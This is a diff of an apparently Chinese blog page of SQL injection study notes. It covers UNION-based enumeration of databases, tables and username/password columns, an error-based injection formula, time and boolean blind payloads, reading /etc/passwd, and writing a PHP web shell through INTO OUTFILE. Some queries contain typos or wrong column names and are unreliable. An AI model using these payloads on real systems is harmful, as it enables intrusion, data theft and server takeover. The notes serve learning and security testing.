@@ -240,17 +240,33 @@
 
 <ul>
   <li>
-    <p>原理：通过把sql命令插入到web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行的sql命令的目的</p>
+    <p>原理：数据与代码未分离</p>
   </li>
-  <li>常规做法：
+  <li>数据库相关：
     <ul>
-      <li>找出查询语句的方法是在后面加<code class="highlighter-rouge">’</code> 、 <code class="highlighter-rouge">“</code> 、 <code class="highlighter-rouge">‘)</code>  、 <code class="highlighter-rouge">“)</code>,看是否报错，然后用<code class="highlighter-rouge">and 1=1</code>和<code class="highlighter-rouge">and 1=2</code>判断是否存在注入点，然后根据情况用不同的方法注入</li>
-      <li><a href="http://pentestmonkey.net/category/cheat-sheet/sql-injection">SQLi备忘录</a></li>
-      <li>确定显示位，可以先尝试用<code class="highlighter-rouge">select 1,2,3,4,5……,n#</code>来检测，之后的查询最好用<code class="highlighter-rouge">select @,@,@#</code>、<code class="highlighter-rouge">select NULL,NULL,NULL#</code>，可以保证不会因为数据类型不匹配而测试失败</li>
-      <li>查询数据库名，<code class="highlighter-rouge">SELECT group_concat(schema_name) FROM information_schema.schemata</code></li>
-      <li>查询表名，<code class="highlighter-rouge">select group_concat(table_name) from information_schema.tables where table_schema=’xxxxx’</code></li>
-      <li>查询列名，<code class="highlighter-rouge">Select groupc_concat(column_name) from information_schema.columns where table_name=’xxxxx’</code></li>
-      <li>爆数据，<code class="highlighter-rouge">Select group_concat(column_name) from table_name</code></li>
+      <li>mysql 5.0版本以后提供了information.schema数据库：
+  <img src="/images/posts/2018/03/web/sql/1.png" height="200" width="300" /></li>
+      <li>查看该数据库中的表：schemata、tables、columns需要重点关注
+  <img src="/images/posts/2018/03/web/sql/2.png" height="800" width="500" />
+        <ul>
+          <li>schemata：所有数据库的基本信息，包括数据库名，编码类型，路径等。schema_name列即为数据库名。
+  <img src="/images/posts/2018/03/web/sql/3.png" height="150" width="800" /></li>
+          <li>tables: 储存mysql中的表信息，table_schema是库名信息，table_nama是表名（图太大了，不截了）</li>
+          <li>columns：提供了表中的列信息，columns_name字段对应的字段名</li>
+        </ul>
+      </li>
+      <li>系统函数：
+        <ul>
+          <li>user() ：当前使用者的用户名</li>
+          <li>database()：当前数据库名</li>
+          <li>version()：数据库版本</li>
+          <li>datadir：读取数据库的绝对路径</li>
+          <li>@@vasedir：mysql安装路径</li>
+          <li>@@version_compile_os：操作系统</li>
+          <li>concat()：连接一个或者多个字符串</li>
+          <li>group_concat()：连接一个组的所有字符串，并以逗号分隔每一条数据</li>
+        </ul>
+      </li>
     </ul>
   </li>
   <li><a href="http://blog.51cto.com/wt7315/1828167">分类</a>：
@@ -259,23 +275,55 @@
         <ul>
           <li>UNION:合并两个或多个SELECT语句的结果集，并消去表中重复的行。UNION 内部的 SELECT 语句必须拥有相同数量的列，列也必须拥有相似的数据类型。</li>
           <li><code class="highlighter-rouge">and 1=2 union select 1,version(),database()</code>可以爆出当前使用的版本和数据库名</li>
+          <li><code class="highlighter-rouge">and 1=2 union select 1,2,schema_name from information_schema.schemata limit 1,1 %23爆出数据库名，依次使用limit2，1往下爆库名</code></li>
+          <li>
+            <p><code class="highlighter-rouge">and 1=2 union select 1,2,group_concat(schema_name) from information_schema.schemata %23</code></p>
+          </li>
+          <li>假设有flag库：
+            <ul>
+              <li><code class="highlighter-rouge">and 1=2 union select 1,2,group_concat(table_name) from information_schema.tables where schema_name=’flag’</code> 爆出flag库下的所有的表，假设其中有flagtable表</li>
+              <li><code class="highlighter-rouge">and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name =’flagtale’</code>爆出flagtable下的所有字段，假设有name和password字段</li>
+              <li><code class="highlighter-rouge">and 1=2 union select 1,2,group_concat(name,password) from flag.flagtable</code> 爆出flag下的flagtable表的name和password的内容</li>
+            </ul>
+          </li>
         </ul>
       </li>
       <li><a href="http://blog.51cto.com/wt7315/1891458">基于错误回显</a>
         <ul>
-          <li>通过sql语句的矛盾性来使数据被回显到页面上
-  <img src="/images/posts/2018/03/web//报错.png" height="400" width="800" /></li>
+          <li>用到的函数：
+            <ul>
+              <li>count():统计元祖的个数
+   <img src="/images/posts/2018/03/web/sql/4.png" height="100" width="400" /></li>
+              <li>rand():0~1的随机数
+   <img src="/images/posts/2018/03/web/sql/5.png" height="100" width="250" /></li>
+              <li>floor():向下取整,select floor(rand()*2);的结果为0或者1
+   <img src="/images/posts/2018/03/web/sql/6.png" height="200" width="250" /></li>
+              <li>group_concat():将数据进行拼接
+   <img src="/images/posts/2018/03/web/sql/7.png" height="100" width="400" /></li>
+            </ul>
+          </li>
+          <li>整合语句：<code class="highlighter-rouge">select count(*),concat(0x3a,0x3a,database(),0x3a,floor(rand()*2))name from information_schema.tables group by name;</code>
+ <img src="/images/posts/2018/03/web/sql/8.png" height="200" width="800" />
+            <ul>
+              <li>生成随机数并取整，然后用分号将不同的数据拼接，并取别名name，最后将结果以name进行分组并进行统计，能看到统计出的两个不同的取值，0和1。</li>
+              <li>多重复几次就会报错
+ <img src="/images/posts/2018/03/web/sql/9.png" height="30" width="800" /></li>
+            </ul>
+          </li>
+          <li>公式：<code class="highlighter-rouge">username=admin' and (select 1 from (select count(*), concat(floor(rand(0)*2),0x23,(你想获取的数据的sql语句))x from information_schema.tables group by x )a) and '1' = '1</code></li>
         </ul>
       </li>
       <li>基于盲注
         <ul>
-          <li>时间盲注: <code class="highlighter-rouge">and if(ascii(substr((select schema_name from information_schema.schemata limit 1,1),1,1))&gt;100,1,sleep(3))%23</code></li>
-          <li>布尔型的盲注: 爆数据库的路径<code class="highlighter-rouge">and ascii(substr(@@datadir,1,1)）&gt;69 %23</code>然后使用二分法一步一步确定</li>
+          <li>时间盲注:
+            <ul>
+              <li>加入特定的时间函数，通过查看是web页面返回的时间差来判断注入的语句是否正确</li>
+              <li><code class="highlighter-rouge">and if(ascii(substr((select schema_name from information_schema.schemata limit 1,1),1,1))&gt;100,1,sleep(3))%23</code></li>
+            </ul>
+          </li>
+          <li>布尔型的盲注: <code class="highlighter-rouge">and ascii(substr(@@datadir,1,1)）&gt;69 %23</code></li>
         </ul>
       </li>
-      <li>基于user-agent</li>
-      <li>基于referer</li>
-      <li>基于cookie</li>
       <li>二次注入:分为语句插入和语句执行</li>
       <li><a href="http://www.91ri.org/8611.html">宽字节注入</a>:  （字符集好方啊，我得专门总结一篇啊😂
         <ul>
@@ -286,7 +334,13 @@
       <li><a href="https://www.anquanke.com/post/id/85936">其他</a>：
         <ul>
           <li>读文件：SELECT LOAD_FILE(‘/etc/passwd’);</li>
-          <li>写文件：SELECT ‘<? system($_GET['c']); ?>’ INTO OUTFILE ‘/var/www/shell.php’;</li>
+          <li>写文件：
+            <ul>
+              <li><code class="highlighter-rouge">SELECT '&lt;? system($_GET['c']); ?&gt;' INTO OUTFILE/DUMPFILE '/var/www/shell.php';</code></li>
+              <li>into dumpfile 能导出一个完整能执行的2进制文件,函数不对任何列或行进行终止，也不执行任何转义处理</li>
+              <li>在UDF提权的场景是需要上传二进制文件等等用dumpfile</li>
+            </ul>
+          </li>
           <li>带外通道：利用其他协议或者渠道从服务器提取数据. 它可能是HTTP（S）请求，DNS解析服务，SMB服务，Mail服务等.</li>
         </ul>
       </li>
